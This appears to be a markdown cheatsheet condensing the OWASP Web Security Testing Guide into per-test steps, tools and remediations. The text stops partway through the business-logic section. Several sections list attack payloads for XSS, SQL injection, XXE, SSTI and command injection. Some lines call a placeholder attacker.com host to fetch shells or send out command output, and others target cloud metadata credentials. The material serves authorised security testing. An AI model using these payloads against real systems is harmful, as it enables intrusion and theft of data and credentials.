---
title: "OWASP WSTG v4.2"
description: "WSTG Cheet Sheet"
category: "Web PenTesting"
tags: ["web-security", "owasp", "bug-bounty", "cheetsheet", "pentesting"]
date: "2026-06-01"
source: OWASP WSTG v4.2 (465 pages)
---

# 🛡️ OWASP WSTG v4.2 — Complete Cheatsheet

> About This Guide
> The **OWASP Web Security Testing Guide (WSTG)** is the premier resource for web application security testing. This cheatsheet covers all **97 test cases** across **12 categories**, formatted for quick Obsidian navigation.
>
> **Test ID Format:** `WSTG-<CATEGORY>-<NN>` (e.g. `WSTG-INFO-01`)
> **Versioned Format:** `WSTG-v42-<CATEGORY>-<NN>`

---

## 📚 Quick Navigation

- **📡 INFO — Information Gathering** — `INFO` — 10 tests
- **⚙️ CONF — Configuration & Deployment** — `CONF` — 11 tests
- **🪪 IDNT — Identity Management** — `IDNT` — 5 tests
- **🔐 ATHN — Authentication Testing** — `ATHN` — 10 tests
- **🚪 ATHZ — Authorization Testing** — `ATHZ` — 4 tests
- **🍪 SESS — Session Management** — `SESS` — 9 tests
- **💉 INPV — Input Validation** — `INPV` — 19 tests
- **⚠️ ERRH — Error Handling** — `ERRH` — 2 tests
- **🔒 CRYP — Weak Cryptography** — `CRYP` — 4 tests
- **🏢 BUSL — Business Logic** — `BUSL` — 9 tests
- **🖥️ CLNT — Client-Side Testing** — `CLNT` — 13 tests
- **🔌 APIT — API Testing** — `APIT` — 1 test
---

## 🔑 Core Principles

> `Tip` Testing Philosophy
> - **No Silver Bullet** — scanners find low-hanging fruit; manual testing is essential
> - **SDLC is King** — integrate security in every phase (define → design → develop → deploy → maintain)
> - **Test Early & Often** — bugs found early are cheaper to fix
> - **Think Strategically** — patch-and-penetrate model is ineffective
> - **Understand Scope** — classify assets, understand legal requirements

> `Note` Testing Techniques
> - **Manual Inspection** — Best for people, process, policy; Limited by time consumption
> - **Threat Modeling** — Best for architecture review; Limited by requiring early engagement
> - **Source Code Review** — Best for finding hidden bugs; Limited by needing source access
> - **Penetration Testing** — Best for runtime behavior and real-world simulation; Limited by code coverage

> `Example` SDLC Security Phases
> - **Phase 1 (Pre-Dev):** Review policies, security requirements
> - **Phase 2 (Design):** Threat model, architecture review
> - **Phase 3 (Development):** Code review, unit security tests
> - **Phase 4 (Deployment):** Penetration testing, config review
> - **Phase 5 (Maintenance):** Ongoing monitoring, vulnerability management

---

## 📡 INFO — Information Gathering

> `Info` Category Summary
> Map the target's attack surface: servers, technologies, frameworks, entry points, and exposed information before active testing begins.

### WSTG-INFO-01 · Search Engine Reconnaissance
**Objective:** Find sensitive design/config info exposed directly or via third parties.

**How to Test:**
- Use Google dorks: `site:`, `inurl:`, `intitle:`, `filetype:`, `cache:`
- Search engines to use: Google, Bing, DuckDuckGo, Shodan, Wayback Machine
- Google Hacking Database (GHDB) dork categories: footholds, sensitive directories, error messages, passwords

**Key Dork Examples:**
```
site:example.com filetype:pdf
site:example.com inurl:admin
cache:example.com
intitle:"index of" site:example.com
```

**Remediation:** Audit publicly available info; use `robots.txt` and `<meta name="robots">` tags; review data posted online.

---

### WSTG-INFO-02 · Fingerprint Web Server
**Objective:** Determine version/type of web server for known vulnerability discovery.

**How to Test:**
- **Banner Grabbing:** `curl -I https://example.com` or `telnet`/`openssl`
- **Malformed Requests:** Send invalid HTTP methods (e.g., `GET / SANTA CLAUS/1.1`) and examine error responses
- **Header Field Order:** Apache vs nginx vs lighttpd have distinct ordering
- **Tools:** `nmap`, `nikto`, `whatweb`

---

### WSTG-INFO-03 · Review Webserver Metafiles
**Objective:** Identify hidden paths/functionality via metadata files.

**How to Test:**
- Check `robots.txt` — disallowed paths reveal sensitive areas
- Check `sitemap.xml` — enumerates all app pages
- Check `security.txt` (RFC 9116)
- Look for `humans.txt`, `.well-known/` directory
- Review `<meta>` tags in HTML source

---

### WSTG-INFO-04 · Enumerate Applications on Webserver
**Objective:** Enumerate all applications on a web server.

**How to Test:**
- Different base URLs: `http://IP/`, non-standard ports (8080, 8443, 8888)
- Virtual host enumeration via DNS, certificate SANs
- Directory brute-forcing: `gobuster`, `dirb`, `ffuf`
- Tools: `nmap` (service scan), `whatweb`

---

### WSTG-INFO-05 · Review Webpage Content for Information Leakage
**Objective:** Find info leakage in HTML comments, metadata, JS files.

**How to Test:**
- View page source — look for HTML comments, API keys, internal paths
- Examine JavaScript files for endpoints, secrets, credentials
- Check `<meta>` tags for generator info
- Look for version strings, debug comments, TODO/FIXME notes

---

### WSTG-INFO-06 · Identify Application Entry Points
**Objective:** Map all entry and injection points via request/response analysis.

**How to Test:**
- Use intercepting proxy (Burp Suite, ZAP) to capture all requests
- Map: GET/POST parameters, cookies, HTTP headers, JSON/XML body fields
- Identify hidden fields, encoded parameters

---

### WSTG-INFO-07 · Map Execution Paths
**Objective:** Map target application workflows.

**How to Test:**
- Spider/crawl the application
- Manually walk all user flows
- Identify code paths: `if/else`, error handling, redirect chains
- Tools: Burp Spider, ZAP Spider

---

### WSTG-INFO-08 · Fingerprint Web Application Framework
**Objective:** Identify components and frameworks in use.

**How to Test:**
- Check HTTP headers: `X-Powered-By`, `X-Generator`, `X-AspNet-Version`
- Check cookies: `PHPSESSID` (PHP), `JSESSIONID` (Java), `ASP.NET_SessionId`
- Look for framework-specific files/paths (e.g., `/wp-admin`, `/joomla`, `/_next/`)
- HTML source patterns (generator meta tags)
- Tools: `whatweb`, `wappalyzer`

---

### WSTG-INFO-09 · Fingerprint Web Application
**Objective:** Generate a map of the application based on research.

**How to Test:**
- Compile all findings from INFO-01 through INFO-08
- Identify CMS, e-commerce platforms, custom frameworks
- Map technology stack: language, server, DB, CDN

---

### WSTG-INFO-10 · Map Application Architecture
**Objective:** Understand full architecture including backend components.

**How to Test:**
- Identify load balancers, reverse proxies, WAFs (inconsistent responses, special headers)
- Map database types (error messages, query syntax hints)
- Identify caching layers, CDNs, third-party APIs

---

## ⚙️ CONF — Configuration & Deployment Management

> `Info` Category Summary
> Verify that the infrastructure and application platform are securely configured — no defaults, no unnecessary exposure.

### WSTG-CONF-01 · Network Infrastructure Configuration
**Objective:** Review network configurations; ensure no known vulnerabilities from unmaintained software.

**How to Test:**
- Check software versions against CVE databases
- Look for default credentials on network devices
- Test for unnecessary open ports via `nmap`
- Review firewall/IDS/WAF configurations

---

### WSTG-CONF-02 · Application Platform Configuration
**Objective:** Ensure defaults/known files removed; no debug code in production.

**How to Test:**
- Check for sample/default pages (e.g., Apache's `/manual/`, IIS's `iisstart.htm`)
- Verify debug modes are off
- Review application logs for sensitive data
- Check HTTP response headers for info leakage

**Common Checks:**
```
/manager/html        (Tomcat manager)
/phpinfo.php         (PHP info)
/.htaccess           (Apache config leakage)
/web.config          (IIS config)
```

---

### WSTG-CONF-03 · File Extension Handling
**Objective:** Find sensitive file extensions that expose raw data or credentials.

**How to Test:**
- Dirbust with sensitive extensions: `.bak`, `.old`, `.tmp`, `.swp`, `.~`, `.log`, `.sql`, `.conf`
- Try appending extensions to known paths: `config.php.bak`
- Check if framework bypasses exist (e.g., `.php;.jpg`)

---

### WSTG-CONF-04 · Old Backup & Unreferenced Files
**Objective:** Find unreferenced files with sensitive information.

**How to Test:**
- Brute-force with wordlists (common backup names)
- Try predictable patterns: `index.php.bak`, `index.bak`, `backup.zip`
- Check Wayback Machine for old URLs
- Look for common editor temp files: `.file.swp` (vim), `#file#` (emacs)

**Remediation:** Never edit files in-place on production; use version control; implement proper file permissions.

---

### WSTG-CONF-05 · Admin Interface Enumeration
**Objective:** Identify hidden admin interfaces.

**How to Test:**
- Brute-force common admin paths: `/admin`, `/administrator`, `/manager`, `/cpanel`, `/phpmyadmin`
- Check source code and JS for admin references
- Port scan for admin services (alternate ports)
- Check documentation for default admin URLs

---

### WSTG-CONF-06 · Test HTTP Methods
**Objective:** Enumerate HTTP methods; test for access control bypass and dangerous methods.

**How to Test:**
```bash
curl -v -X OPTIONS https://example.com
curl -v -X PUT https://example.com/test.txt -d "test"
curl -v -X DELETE https://example.com/resource
```
- **XST (Cross-Site Tracing):** Test if `TRACE` method is enabled — can steal cookies
- **Method Override:** Test `X-HTTP-Method-Override` and `X-Method-Override` headers

**Dangerous Methods:** `PUT`, `DELETE`, `TRACE`, `CONNECT`, `PATCH`

**Remediation:** Disable unused methods; ensure access controls apply per-method.

---

### WSTG-CONF-07 · HTTP Strict Transport Security (HSTS)
**Objective:** Review HSTS header validity.

**How to Test:**
```bash
curl -s -D - https://example.com | grep -i strict
```
- **Valid header:** `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
- Check: max-age (min 1 year = 31536000), `includeSubDomains`, `preload` status

---

### WSTG-CONF-08 · RIA Cross Domain Policy
**Objective:** Review crossdomain.xml and clientaccesspolicy.xml policy files.

**How to Test:**
- Request `https://example.com/crossdomain.xml`
- Request `https://example.com/clientaccesspolicy.xml`
- Look for overly permissive `allow-access-from domain="*"` rules

---

### WSTG-CONF-09 · File Permissions
**Objective:** Identify rogue file permissions.

**How to Test:**
```bash
ls -la /path/to/webroot
namei -l /path/to/file
find / -perm -o+w 2>/dev/null    # World-writable files
find / -perm -4000 2>/dev/null   # SUID files
```
- Windows: use `AccessEnum`, `icacls`

**Remediation:** Apply principle of least privilege; no world-writable web files.

---

### WSTG-CONF-10 · Subdomain Takeover
**Objective:** Identify forgotten/misconfigured subdomains that can be claimed.

**How to Test:**
- Enumerate subdomains: `subfinder`, `amass`, `assetfinder`, certificate transparency logs
- Check DNS CNAMEs pointing to cloud services (GitHub Pages, Heroku, S3, Azure)
- Try to claim unclaimed services matching dangling DNS records

**Common Vulnerable Services:** GitHub Pages, Heroku, Fastly, Amazon S3, Azure, Shopify

**Remediation:** Remove dangling DNS records immediately; implement continuous monitoring.

---

### WSTG-CONF-11 · Cloud Storage
**Objective:** Ensure cloud storage access controls are properly configured.

**How to Test:**
- Identify storage URLs (S3: `*.s3.amazonaws.com`, Azure Blob: `*.blob.core.windows.net`)
- Test for: unauthenticated read, write, delete, list operations
- Tools: `aws s3 ls s3://bucket-name --no-sign-request`, `GCPBucketBrute`

---

## 🪪 IDNT — Identity Management Testing

> `Info` Category Summary
> Verify that the application correctly defines and enforces user roles, registration processes, and account management.

### WSTG-IDNT-01 · Test Role Definitions
**Objective:** Identify and document application roles; test for role switching.

**How to Test:**
- Document all user roles (guest, user, admin, super-admin)
- Attempt to access resources from wrong role (horizontal/vertical privilege escalation)
- Verify role separation enforced server-side

---

### WSTG-IDNT-02 · Test User Registration Process
**Objective:** Verify registration requirements align with business/security requirements.

**How to Test:**
- Can anyone register (no verification)?
- Is email verification enforced?
- Can you register with special chars, very long names, or existing usernames?
- Is there a CAPTCHA? Can it be bypassed?
- Test for username enumeration via error messages

---

### WSTG-IDNT-03 · Test Account Provisioning Process
**Objective:** Verify which accounts can provision others.

**How to Test:**
- Map all provisioning workflows
- Test if a regular user can provision admin accounts
- Check for out-of-band provisioning (email, paper forms) — are they audited?

---

### WSTG-IDNT-04 · Account Enumeration
**Objective:** Detect if usernames/accounts can be enumerated.

**How to Test:**
- Compare error messages: "username not found" vs "wrong password" — different = vulnerable
- Check registration: "username already taken" confirms existence
- Timing attacks: login responses may take longer for valid vs invalid usernames
- Password reset: response differences reveal valid accounts

**Remediation:** Use generic error messages ("Invalid credentials"); implement consistent response times.

---

### WSTG-IDNT-05 · Weak Username Policy
**Objective:** Determine if username structure enables account guessing.

**How to Test:**
- Identify username pattern (e.g., `first.last`, `f.last`)
- Try predictable usernames for known employees
- Check if usernames are case-sensitive

---

## 🔐 ATHN — Authentication Testing

> `Info` Category Summary
> Verify that authentication mechanisms properly verify identity and are resistant to common attacks.

### WSTG-ATHN-01 · Credentials Over Encrypted Channel
**Objective:** Ensure credentials are never transmitted over unencrypted channels.

**How to Test:**
- Check login form action: `http://` vs `https://`
- Intercept traffic — are credentials in plaintext?
- Check if cookies are sent over HTTP
- Verify HSTS is configured (links to [[#WSTG-CONF-07 · HTTP Strict Transport Security (HSTS)]])

---

### WSTG-ATHN-02 · Default Credentials
**Objective:** Test if default credentials are still in use.

**How to Test:**
- Identify all application components (CMS, databases, frameworks)
- Check vendor documentation and default credential lists
- Tools: `changeme`, Metasploit's `scanner/http/http_login`
- Common defaults: `admin/admin`, `admin/password`, `root/root`, `guest/guest`

**Resources:** CIRT.net default password database, DefaultCreds-cheat-sheet

---

### WSTG-ATHN-03 · Weak Lockout Mechanism
**Objective:** Evaluate lockout mechanism against brute force.

**How to Test:**
- Attempt repeated failed logins — when does lockout trigger?
- Test if lockout applies: per IP, per account, globally
- Test lockout bypass: change User-Agent, rotate IPs, use `X-Forwarded-For`
- Verify lockout duration and unlock method
- Test CAPTCHA effectiveness

---

### WSTG-ATHN-04 · Authentication Bypass
**Objective:** Ensure authentication is enforced everywhere.

**How to Test:**
- Directly access post-auth URLs without logging in
- Force-browse to authenticated pages
- Tamper with parameters indicating auth state (`auth=1`, `isAdmin=true`)
- Test alternate authentication paths (mobile API, REST API, SOAP)
- Manipulate cookies or auth tokens

---

### WSTG-ATHN-05 · Vulnerable Remember Password
**Objective:** Validate that "remember me" tokens are securely managed.

**How to Test:**
- Inspect "remember me" cookie: is it a long random token or predictable?
- Is the token stored server-side and invalidated on logout?
- Can the same persistent token be used from multiple locations?
- Is the token scope-limited (IP, user-agent)?

---

### WSTG-ATHN-06 · Browser Cache Weaknesses
**Objective:** Check if sensitive data is stored client-side or accessible after logout.

**How to Test:**
- Check `Cache-Control` and `Pragma` headers on authenticated pages
- Press Back button after logout — does the browser show cached authenticated page?
- Check `autocomplete="off"` on password fields
- Inspect browser cache/history for sensitive data

**Correct Headers:**
```http
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

---

### WSTG-ATHN-07 · Weak Password Policy
**Objective:** Determine resistance to brute-force and dictionary attacks.

**How to Test:**
- Test minimum password length (should be ≥ 8 chars, ideally 12+)
- Test complexity requirements
- Test if common passwords are rejected (e.g., "password123")
- Check if password is checked against breach databases (Have I Been Pwned)
- Attempt to brute-force with Hydra, Burp Intruder

---

### WSTG-ATHN-08 · Weak Security Question/Answer
**Objective:** Assess security question complexity and guessability.

**How to Test:**
- Are questions easily guessable (mother's maiden name, pet's name)?
- Can answers be enumerated/brute-forced?
- Is there a lockout on security question attempts?
- Are answers stored in plaintext?

---

### WSTG-ATHN-09 · Weak Password Change/Reset
**Objective:** Determine resistance to account takeover via password reset.

**How to Test:**
- Is the reset token random and long enough?
- Does the token expire quickly (< 1 hour)?
- Can the token be used multiple times?
- Is the old password required to change to a new one?
- Test for reset token leakage in HTTP Referer header
- Test for host header injection in reset emails

---

### WSTG-ATHN-10 · Weaker Auth in Alternative Channel
**Objective:** Identify alternative authentication channels and assess their security.

**How to Test:**
- Mobile app API — does it have the same controls as web app?
- REST/SOAP API — same lockout, same session management?
- Test direct API endpoints bypassing frontend controls

---

## 🚪 ATHZ — Authorization Testing

> `Info` Category Summary
> Verify that users can only access what they are authorized to access — both horizontally (other users) and vertically (higher privileges).

### WSTG-ATHZ-01 · Directory Traversal / File Include
**Objective:** Identify path traversal vulnerabilities; test bypass techniques.

**How to Test:**
- Inject `../` sequences in file parameters: `?file=../../../etc/passwd`
- URL-encoded variants: `%2e%2e%2f`, `%252e%252e%252f`
- OS-specific separators: `..\..\` on Windows
- Test LFI: `?page=../../../../etc/shadow`
- Test RFI: `?page=http://attacker.com/shell.txt`

**Common Bypass Techniques:**
```
../
..\
..%2f
%2e%2e/
....//   (double dot-slash)
..%252f  (double encoded)
```

---

### WSTG-ATHZ-02 · Authorization Schema Bypass
**Objective:** Test for horizontal and vertical access control bypass.

**How to Test:**
- **Horizontal:** Access another user's resources (change user ID in URL/param)
- **Vertical:** Access higher-privilege functions (access `/admin` as regular user)
- Test with: different accounts, manipulated role parameters, JWT tampering
- Check if authorization is enforced server-side vs client-side

---

### WSTG-ATHZ-03 · Privilege Escalation
**Objective:** Test for privilege manipulation.

**How to Test:**
- Manipulate role/privilege parameters in requests
- Test parameter tampering: `role=admin`, `isAdmin=true`, `privilege=3`
- Check for mass assignment vulnerabilities (add extra fields to POST body)
- Test IDOR leading to privilege escalation

---

### WSTG-ATHZ-04 · Insecure Direct Object References (IDOR)
**Objective:** Identify and exploit insecure object references.

**How to Test:**
- Change IDs in URLs/parameters: `/api/users/123` → `/api/users/124`
- Test GUIDs: are they truly random or predictable?
- Check file access: `?file=report_user1.pdf` → `?file=report_user2.pdf`
- Test with multiple accounts to verify cross-account access

**Remediation:** Implement authorization checks server-side for every object access; use indirect references (hashed IDs, GUIDs).

---

## 🍪 SESS — Session Management Testing

> `Info` Category Summary
> Verify that session tokens are secure, properly managed, and resistant to hijacking, fixation, and forgery.

### WSTG-SESS-01 · Session Management Schema
**Objective:** Analyze session token randomness and integrity.

**How to Test:**
- Capture multiple tokens for the same user and different users
- Analyze entropy — tokens should be ≥ 128 bits of randomness
- Check if tokens are predictable (sequential, time-based, encoded user data)
- Tools: Burp Sequencer for statistical token analysis

---

### WSTG-SESS-02 · Cookie Attributes
**Objective:** Verify proper cookie security flags.

**How to Test:**
Check each cookie for these attributes:

- **`Secure`** — Ensures transmission only over HTTPS; Risk: Token transmitted in HTTP
- **`HttpOnly`** — Prevents JavaScript access; Risk: XSS can steal cookie
- **`SameSite=Strict/Lax`** — Provides CSRF protection; Risk: CSRF vulnerability
- **`Domain`** — Restricts cookie scope; Risk: Over-broad sharing
- **`Path`** — Restricts cookie scope; Risk: Over-broad sharing
- **`Expires/Max-Age`** — Controls session duration; Risk: Infinite session

**Cookie Prefixes:** `__Secure-` (requires Secure flag), `__Host-` (requires Secure + no Domain + Path=/)

---

### WSTG-SESS-03 · Session Fixation
**Objective:** Test if session tokens change after authentication.

**How to Test:**
1. Get a session token without logging in
2. Authenticate using that token
3. Check if the token value changes after login
4. If unchanged → **Session Fixation Vulnerability**

**Remediation:** Always regenerate session token upon successful login.

---

### WSTG-SESS-04 · Exposed Session Variables
**Objective:** Ensure session tokens are encrypted in transit and not cached.

**How to Test:**
- Are session tokens in URLs (`PHPSESSID=xxx` in GET params)?
- Are session tokens in HTTP headers sent over plain HTTP?
- Check caching headers on pages containing session tokens

---

### WSTG-SESS-05 · Cross-Site Request Forgery (CSRF)
**Objective:** Determine if unauthenticated requests can be forged on behalf of a user.

**How to Test:**
- Identify state-changing requests (POST, PUT, DELETE)
- Check for CSRF token in form/headers
- Test if CSRF token is validated server-side
- Test SameSite cookie attribute enforcement
- Attempt a CSRF PoC from a different origin

**Example PoC:**
```html
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Remediation:** Use CSRF tokens; implement SameSite cookies; verify Origin/Referer headers.

---

### WSTG-SESS-06 · Logout Functionality
**Objective:** Verify session is fully invalidated on logout.

**How to Test:**
- Log out; attempt to reuse the old session token
- Check if server-side session is destroyed (not just client-side cookie deletion)
- Test "logout all devices" functionality
- Check if Back button shows authenticated content after logout

---

### WSTG-SESS-07 · Session Timeout
**Objective:** Validate that a hard idle session timeout exists.

**How to Test:**
- Leave a session idle; test if it expires after expected time
- Verify both idle timeout AND absolute timeout exist
- Recommended: ≤ 15 minutes for sensitive apps (banking), up to 60 min for low-risk

---

### WSTG-SESS-08 · Session Puzzling (Variable Overloading)
**Objective:** Test if session variables are reused across different contexts.

**How to Test:**
- Identify all session variables used across flows
- Test if completing one flow's session setup grants access to another flow
- Example: using a password-reset flow session to bypass login

---

### WSTG-SESS-09 · Session Hijacking
**Objective:** Test for session token exposure via network or XSS.

**How to Test:**
- Verify `Secure` cookie flag prevents HTTP transmission
- Test for network sniffing opportunities (mixed content)
- Test if XSS can access session cookies (check `HttpOnly`)
- Test for token in Referer header, URL, or logs

---

## 💉 INPV — Input Validation Testing

> `Info` Category Summary
> Verify that all user-supplied input is properly validated and sanitized before use. The largest category in WSTG.

### WSTG-INPV-01 · Reflected XSS
**Objective:** Find input vectors where user input is reflected in the response without sanitization.

**How to Test:**
- Identify all reflection points (URL params, form fields, headers, cookies)
- Test with: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
- Bypass filters with encoding: `%3cscript%3e`, `<SCRiPT>`, `&#x3C;script&#x3E;`

**Common Bypass Payloads:**
```javascript
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
```

---

### WSTG-INPV-02 · Stored XSS
**Objective:** Find stored input that executes in other users' browsers.

**How to Test:**
- Identify all storage points: comments, profiles, messages, file names
- Inject XSS payload; trigger retrieval in another browser/account
- Most dangerous: admin panels, user dashboards, shared content

**Remediation:** Output encode all user-controlled data; use Content Security Policy (CSP).

---

### WSTG-INPV-03 · HTTP Verb Tampering
> [!note] Merged into [[#WSTG-CONF-06 · Test HTTP Methods]]

---

### WSTG-INPV-04 · HTTP Parameter Pollution (HPP)
**Objective:** Test how app handles duplicate parameter names.

**How to Test:**
```
?id=1&id=2        → app uses first, last, or concatenated?
?sort=ASC&sort=DESC
```
- Different backends parse differently (see HPP parsing table):
  - PHP/Apache: last value
  - ASP.NET/IIS: comma-concatenated
  - JSP/Tomcat: first value

---

### WSTG-INPV-05 · SQL Injection
**Objective:** Test if SQL queries can be manipulated via user input.

**Detection Techniques:**
```sql
-- Error-based
' OR '1'='1
' AND 1=1--
' AND 1=2--

-- Time-based (blind)
'; WAITFOR DELAY '0:0:5'--   (MSSQL)
'; SELECT SLEEP(5)--          (MySQL)

-- UNION-based
' UNION SELECT NULL,NULL,NULL--
```

**Sub-Tests:**
- `WSTG-INPV-05.1` Oracle | `WSTG-INPV-05.2` MySQL | `WSTG-INPV-05.3` SQL Server
- `WSTG-INPV-05.4` PostgreSQL | `WSTG-INPV-05.5` MS Access
- `WSTG-INPV-05.6` NoSQL Injection | `WSTG-INPV-05.7` ORM Injection | `WSTG-INPV-05.8` Client-side SQLi

**Tools:** `sqlmap`, manual testing with Burp Suite

**Remediation:** Use parameterized queries/prepared statements; apply input validation; least-privilege DB accounts.

---

### WSTG-INPV-06 · LDAP Injection
**Objective:** Identify and exploit LDAP injection points.

**How to Test:**
```
*)(uid=*))(|(uid=*    (filter bypass)
*                      (wildcard)
)(|(password=*)        (attribute extraction)
```

---

### WSTG-INPV-07 · XML Injection / XXE
**Objective:** Test XML inputs for injection and external entity processing.

**XXE Payloads:**
```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/">]>
```

---

### WSTG-INPV-08 · SSI Injection (Server-Side Includes)
**Objective:** Identify SSI injection points in HTML files.

**Test Payloads:**
```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="id" -->
<!--#include virtual="/etc/passwd" -->
```

---

### WSTG-INPV-09 · XPath Injection
**Objective:** Test XPath queries for injection.

**Test Payloads:**
```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
```

---

### WSTG-INPV-10 · IMAP/SMTP Injection
**Objective:** Test for injection in mail-related functionality.

**How to Test:**
- Inject CRLF characters into email fields: `test%0d%0aCC:attacker@evil.com`
- Test IMAP commands in search/mailbox parameters

---

### WSTG-INPV-11 · Code Injection (+ LFI/RFI)
**Objective:** Find code injection points.

**Test Payloads by Language:**
```php
# PHP
<?php system('id'); ?>
eval(base64_decode('cGhwaW5mbygpOw=='));

# Python
__import__('os').system('id')
```

**LFI Sub-test (INPV-11.1):**
```
?file=../../etc/passwd
?page=/proc/self/environ
?file=php://filter/convert.base64-encode/resource=index.php
```

**RFI Sub-test (INPV-11.2):**
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```

---

### WSTG-INPV-12 · Command Injection
**Objective:** Test OS command injection points.

**Test Payloads:**
```bash
; id
| id
& id
&& id
`id`
$(id)
; cat /etc/passwd
```

**Blind Command Injection:**
```bash
; sleep 5
; ping -c 5 attacker.com
; curl http://attacker.com/`whoami`
```

---

### WSTG-INPV-13 · Format String Injection
**Objective:** Test for C-style format string vulnerabilities.

**Test Payloads:**
```
%s%s%s%s
%x%x%x%x
%n
%p%p%p%p
```

---

### WSTG-INPV-14 · Incubated Vulnerability
**Objective:** Test for stored injections requiring a recall step.

**How to Test:**
- Inject payload that isn't immediately executed
- Trigger execution by performing another action (e.g., log viewing, report generation)

---

### WSTG-INPV-15 · HTTP Splitting/Smuggling
**Objective:** Test for HTTP request splitting and smuggling.

**How to Test (Splitting):**
```
param=value%0d%0aInjected-Header: injected-value
```

**Smuggling:** Test `CL.TE` and `TE.CL` desynchronization between frontend/backend servers.

---

### WSTG-INPV-16 · HTTP Incoming Requests
**Objective:** Monitor for suspicious/unexpected incoming requests.

**How to Test:**
- Review proxy/server logs for anomalous patterns
- Look for scan signatures, unusual methods, path traversal attempts

---

### WSTG-INPV-17 · Host Header Injection
**Objective:** Test if Host header is processed dynamically (password reset poisoning, cache poisoning).

**How to Test:**
```http
GET /reset-password?token=xxx HTTP/1.1
Host: attacker.com
```
- Test with: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`
- Check if password reset email contains attacker-controlled host

---

### WSTG-INPV-18 · Server-Side Template Injection (SSTI)
**Objective:** Find SSTI vulnerabilities in template engines.

**Detection Payloads by Engine:**
```
{{7*7}}        → Jinja2/Twig (expect 49)
${7*7}         → FreeMarker, Thymeleaf
<%= 7*7 %>     → ERB (Ruby)
#{7*7}         → Pebble
*{7*7}         → Thymeleaf (Spring)
```

**RCE Payloads (Jinja2):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

### WSTG-INPV-19 · Server-Side Request Forgery (SSRF)
**Objective:** Test if server makes requests to attacker-controlled targets.

**How to Test:**
- Find parameters accepting URLs: `?url=`, `?src=`, `?image=`, `?redirect=`
- Test internal network access: `?url=http://169.254.169.254/` (AWS metadata)
- Test local file access: `?url=file:///etc/passwd`
- Bypass filters: `http://2130706433/` (decimal IP), `http://[::1]/`, DNS rebinding

**AWS Metadata Payload:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Remediation:** Whitelist allowed URLs/IPs; block internal ranges; use allow-list validation.

---

## ⚠️ ERRH — Error Handling

> `Info` Category Summary
> Verify that error messages do not expose sensitive technical information to users.

### WSTG-ERRH-01 · Improper Error Handling
**Objective:** Identify and analyze error output for information leakage.

**How to Test:**
- Force errors: invalid input types, missing parameters, extremely long values
- Send unexpected HTTP methods
- Look for: stack traces, SQL queries, file paths, internal IPs, version numbers, source code
- Test different content-types (`application/json`, `application/xml`)

**What Bad Errors Expose:**
```
Stack trace with class names and line numbers
SQL queries with table/column names
Internal server IPs and ports
File system paths
Framework and library versions
```

**Remediation:** Log errors server-side; return generic messages to users; differentiate error types.

---

### WSTG-ERRH-02 · Stack Traces
> `Note` Merged into [[#WSTG-ERRH-01 · Improper Error Handling]]

---

## 🔒 CRYP — Weak Cryptography

> `Info` Category Summary
> Verify that the application uses strong, properly configured cryptography for data in transit and at rest.

### WSTG-CRYP-01 · Weak Transport Layer Security
**Objective:** Validate TLS configuration and certificate security.

**How to Test:**
```bash
# Using testssl.sh
./testssl.sh https://example.com

# Using nmap
nmap --script ssl-enum-ciphers -p 443 example.com

# Using OpenSSL
openssl s_client -connect example.com:443
```

**What to Check:**
- **Protocol versions** — Reject SSLv2, SSLv3, TLS 1.0, TLS 1.1
- **Weak ciphers** — No RC4, DES, 3DES, NULL, EXPORT
- **Key length** — RSA ≥ 2048-bit, ECDSA ≥ 256-bit
- **Certificate validity** — Not expired, trusted CA, correct domain
- **Forward secrecy** — ECDHE or DHE key exchange required

**Common Vulnerabilities:** POODLE, BEAST, CRIME, BREACH, HEARTBLEED, DROWN

---

### WSTG-CRYP-02 · Padding Oracle
**Objective:** Test for padding oracle vulnerabilities in encrypted data.

**How to Test:**
- Identify encrypted parameters (appear random, base64-encoded, hex)
- Modify last byte of ciphertext block; observe different responses (error vs no error)
- Tool: `padbuster`, `padding-oracle-attacker`

---

### WSTG-CRYP-03 · Sensitive Data Over Unencrypted Channels
**Objective:** Identify sensitive data transmitted without encryption.

**How to Test:**
- Use a proxy/sniffer (Burp, Wireshark) on HTTP traffic
- Look for: credentials, session tokens, PII, financial data, health records, API keys

**Sensitive Data Types:**
- Financial: credit card numbers, bank accounts
- Authentication: passwords, tokens, API keys
- Personal: SSN, DOB, health info, address
- System: internal IPs, credentials

---

### WSTG-CRYP-04 · Weak Encryption
**Objective:** Identify weak or deprecated encryption implementations.

**How to Test:**
- Identify hashing algorithms in use (MD5, SHA-1 are weak for passwords)
- Check if ECB mode is used for block ciphers (reveals patterns)
- Verify IVs are random and not reused
- Check for hardcoded/static keys

**Weak Algorithms:** MD5, SHA-1, RC4, DES, 3DES, ECB mode
**Strong Alternatives:** SHA-256/512, AES-256-GCM, ChaCha20-Poly1305

---

## 🏢 BUSL — Business Logic Testing

> `Info` Category Summary
> Test application workflows for logical flaws that automated tools cannot detect — these are often the highest-value vulnerabilities.

### WSTG-BUSL-01 · Business Logic Data Validation
**Objective:** Ensure all checks occur server-side and cannot be bypassed.

**How to Test:**
- Identify data with logical constraints (age, account balance, quantity)
- Submit negative values, zero values, values exceeding max
- Test validation at handoff points between systems
- Bypass client-side validation by intercepting with proxy

---

### WSTG-BUSL-02 · Ability to Forge Requests
**Objective:** Test if business logic can be bypassed by direct/forged requests.

**How to Test:**
- Identify hidden fields and parameters in forms
- Modify price, discount, quantity fields directly in requests
- Submit multi-step form steps out of order
- Access later workflow steps by forging requests

---

### WSTG-BUSL-03 · Integrity Checks
**Objective:** Test if the application enforces data integrity.

**How to Test:**
- Modify signed/hashed data and test if rejected
- Test if checksums are validated server-side
